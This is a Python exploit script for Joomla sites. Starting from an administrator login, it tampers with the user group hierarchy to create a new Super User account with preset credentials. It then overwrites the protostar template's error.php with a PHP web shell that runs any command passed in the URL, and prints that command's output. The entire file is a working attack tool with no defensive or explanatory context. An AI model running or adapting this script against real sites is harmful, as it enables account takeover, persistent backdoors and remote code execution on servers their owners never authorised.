#!/usr/bin/python
import sys
import requests
import re
import argparse


def extract_token(resp):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
    if match is None:
        print("[-] Cannot find CSRF token!\n")
        return None
    return match.group(1)


def try_admin_login(sess, url, uname, upass):
    admin_url = url + '/administrator/index.php'
    print('[+] Getting token for admin login')
    resp = sess.get(admin_url, verify=True)
    token = extract_token(resp)
    if not token:
        return False
    print('[+] Logging in to admin')
    data = {
        'username': uname,
        'passwd': upass,
        'task': 'login',
        token: '1'
    }
    resp = sess.post(admin_url, data=data, verify=True)
    if 'task=profile.edit' not in resp.text:
        print('[!] Admin Login Failure!')
        return None
    print('[+] Admin Login Successfully!')
    return True


def checkAdmin(url, sess):
    print("[+] Checking admin")
    url_check = url + '/administrator/index.php?option=com_users&view=users'
    resp = sess.get(url_check, verify=True)
    token = extract_token(resp)
    if not token:
        print "[-] You are not administrator!"
        sys.exit()
    return token


def checkSuperAdmin(url, sess):
    print("[+] Checking Superadmin")
    url_check = url + '/administrator/index.php?option=com_config'
    resp = sess.get(url_check, verify=True)
    token = extract_token(resp)
    if not token:
        print "[-] You are not Super-Users!"
        sys.exit()
    return token


def changeGroup(url, sess, token):
    print("[+] Changing group")
    newdata = {
        'jform[title]': 'Public',
        'jform[parent_id]': 100,
        'task': 'group.apply',
        token: 1
    }
    newdata['task'] = 'group.apply'
    resp = sess.post(url + "/administrator/index.php?option=com_users&layout=edit&id=1", data=newdata,
                     verify=True)
    if 'jform[parent_id]' not in resp.text:
        print('[!] Maybe failed to change group...')
        return False
    else:
        print "[+] Done!"
    return True


def create_user(url, sess, username, password, email, token):
    newdata = {
        # Form data
        'jform[name]': username,
        'jform[username]': username,
        'jform[password]': password,
        'jform[password2]': password,
        'jform[email]': email,
        'jform[resetCount]': 0,
        'jform[sendEmail]': 0,
        'jform[block]': 0,
        'jform[requireReset]': 0,
        'jform[id]': 0,
        'jform[groups][]': 8,
        token: 1,
    }
    newdata['task'] = 'user.apply'
    url_post = url + "/administrator/index.php?option=com_users&layout=edit&id=0"
    sess.post(url_post, data=newdata, verify=True)
    sess.get(url + "/administrator/index.php?option=com_login&task=logout&" + token + "=1", verify=True)
    sess = requests.Session()
    if try_admin_login(sess, url, username, password):
        print "[+] Now, you are super-admin!!!!!!!!!!!!!!!!" + "\n[+] Your super-admin account: \n[+] USERNAME: " + username + "\n[+] PASSWORD: " + password + "\n[+] Done!"
    else:
        print "[-] Sorry,exploit fail!"
    return sess


def changeGroupDefault(url, sess, token):
    print("[+] Changing group")
    newdata = {
        'jform[title]': 'Public',
        'jform[parent_id]': 0,
        'task': 'group.apply',
        token: 1
    }
    newdata['task'] = 'group.apply'
    resp = sess.post(url + "/administrator/index.php?option=com_users&layout=edit&id=1", data=newdata,
                     verify=True)
    if 'jform[parent_id]' not in resp.text:
        print('[!] Maybe failed to change group...')
        return False
    else:
        print "[+] Done!"
    return True


def rce(sess, url, cmd, token):
    filename = 'error.php'
    shlink = url + '/administrator/index.php?option=com_templates&view=template&id=506&file=506&file=L2Vycm9yLnBocA%3D%3D'
    shdata_up = {
        'jform[source]': "<?php echo 'Hacked by HK\n' ;system($_GET['cmd']); ?>",
        'task': 'template.apply',
        token: '1',
        'jform[extension_id]': '506',
        'jform[filename]': '/' + filename
    }
    sess.post(shlink, data=shdata_up)
    path2shell = '/templates/protostar/error.php?cmd=' + cmd
    # print '[+] Shell is ready to use: ' + str(path2shell)
    print '[+] Checking:'
    shreq = sess.get(url + path2shell)
    shresp = shreq.text
    print shresp + '[+] Shell link: \n' + (url + path2shell)
    print '[+] Module finished.'


def main():
    # Construct the argument parser
    ap = argparse.ArgumentParser()
    # Add the arguments to the parser
    ap.add_argument("-url", "--url", required=True,
                    help=" URL for your Joomla target")
    ap.add_argument("-u", "--username", required=True,
                    help="username")
    ap.add_argument("-p", "--password", required=True,
                    help="password")
    ap.add_argument("-usuper", "--usernamesuper", default="hk",
                    help="Super's username")
    ap.add_argument("-psuper", "--passwordsuper", default="12345678",
                    help="Super's password")
    ap.add_argument("-esuper", "--emailsuper", default="hk@hk.com",
                    help="Super's Email")
    ap.add_argument("-cmd", "--command", default="whoami",
                    help="command")
    args = vars(ap.parse_args())
    # target
    url = format(str(args['url']))
    print '[+] Your target: ' + url
    # username
    uname = format(str(args['username']))
    # password
    upass = format(str(args['password']))
    # command
    command = format(str(args['command']))
    # username of superadmin
    usuper = format(str(args['usernamesuper']))
    # password of superadmin
    psuper = format(str(args['passwordsuper']))
    # email of superadmin
    esuper = format(str(args['emailsuper']))
    # session
    sess = requests.Session()
    if not try_admin_login(sess, url, uname, upass): sys.exit()
    token = checkAdmin(url, sess)
    if not changeGroup(url, sess, token):
        print "[-] Sorry,exploit fail!"
        sys.exit()
    sess = create_user(url, sess, usuper, psuper, esuper, token)
    token = checkSuperAdmin(url, sess)
    # Now you are Super-admin
    if token:
        # call RCE
        changeGroupDefault(url, sess, token)  # easy to view :))
        rce(sess, url, command, token)


if __name__ == "__main__":
    sys.exit(main())
